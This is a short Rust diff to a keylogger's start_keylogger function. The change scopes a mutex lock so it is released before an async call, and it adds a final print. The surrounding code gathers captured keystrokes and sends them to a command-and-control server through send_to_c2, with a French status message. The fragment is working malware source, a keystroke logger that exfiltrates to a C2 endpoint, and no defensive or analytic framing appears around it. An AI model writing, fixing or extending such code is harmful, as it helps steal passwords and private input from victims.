@@ -53,8 +53,10 @@ pub async fn start_keylogger(duration_sec: u64) {
 
     sleep(Duration::from_secs(duration_sec)).await;
 
-    let logs = KEY_LOGS.lock().unwrap();
-    let log_data = logs.join("");
+    let log_data = {
+        let logs = KEY_LOGS.lock().unwrap();
+        logs.join("")
+    };
 
     match send_to_c2(log_data.into_bytes()).await {
         Ok(_) => println!("Logs envoyés"),
@@ -63,4 +65,6 @@ pub async fn start_keylogger(duration_sec: u64) {
 
     let mut logs = KEY_LOGS.lock().unwrap();
     logs.clear();
+
+    println!("fini");
 }
